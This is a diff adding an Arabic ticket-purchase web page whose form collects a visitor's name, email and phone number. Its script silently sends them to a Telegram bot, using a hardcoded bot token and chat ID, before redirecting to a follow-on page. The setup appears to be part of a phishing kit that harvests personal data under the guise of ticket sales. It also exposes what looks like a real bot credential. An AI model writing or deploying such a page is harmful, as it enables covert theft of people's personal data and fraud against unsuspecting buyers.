@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>شراء التذكرة</title>
+  <style>
+    body {
+      background-color: rgba(255, 255, 255, 0.9);
+      font-family: Arial, sans-serif;
+      color: white;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 400px;
+      margin: 50px auto;
+      background-color: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+      color: #000;
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+      color: orange;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      font-weight: bold;
+    }
+
+    input[type="email"],
+    input[type="tel"] , 
+    input[type="text"]
+    
+    {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: orange;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #e69500;
+    }
+
+    #phone{
+      text-align: right;
+    }
+
+    #botone{
+      width: 350px;
+      
+    } 
+    #phone ,#email ,#text { 
+      width: 330px; 
+      text-align: center;
+      align-self: start;
+    }
+    
+
+  </style>
+</head>
+<body>
+
+  <div class="containr">
+    <h2>يرجى ادخال البريد الالكتروني ورقم الهاتف ليتم ارسال التذاكر   </h2>
+    <form id="ticketForm">
+
+      <label for="email">الاسم </label>
+      <input type="text" id="text" name="email"  required placeholder=" الاسم    ">
+      
+
+      <label for="email">البريد الإلكتروني</label>
+      <input type="email" id="email" name="email"  required placeholder=" البريد الالكتروني   ">
+
+      <label for="phone">رقم الهاتف</label>
+      <input type="tel" id="phone" name="phone" pattern="[0-9]{8,15}" required placeholder=" رقم الهاتف  ">
+
+      <button id="botone" type="submit">متابعة</button>
+    </form>
+  </div>
+
+  <script>
+  document.getElementById('ticketForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    // استلام القيم من النموذج
+    const name = document.getElementById('text').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+
+    // تخزين الاسم في localStorage
+    localStorage.setItem('userName', name);
+
+    // إعداد الرسالة
+    const message = `🧾 معلومات الطلب:\n👤 الاسم: ${name}\n📧 البريد الإلكتروني: ${email}\n📞 رقم الهاتف: ${phone}`;
+
+    // بيانات بوت تيليجرام
+    const botToken = '8086646027:AAH2MyOuWFl3Hw-9KfdbbSjbvYp7p9jkjyE'; // ← ضع التوكن هنا
+    const chatId = '7595871538';     // ← ضع معرف المحادثة هنا
+
+    // إرسال البيانات إلى تيليجرام
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(response => {
+      if (response.ok) {
+        // الانتقال إلى نموذج آخر أو صفحة أخرى بعد الإرسال
+        window.location.href = "select.html"; // ← عدل هذا حسب اسم الصفحة التالية
+      } else {
+      }
+    })
+    .catch(error => {
+      console.error('Telegram Error:', error);
+    });
+  });
+</script>
+
+  </script>
+   
+</body>
+</html>
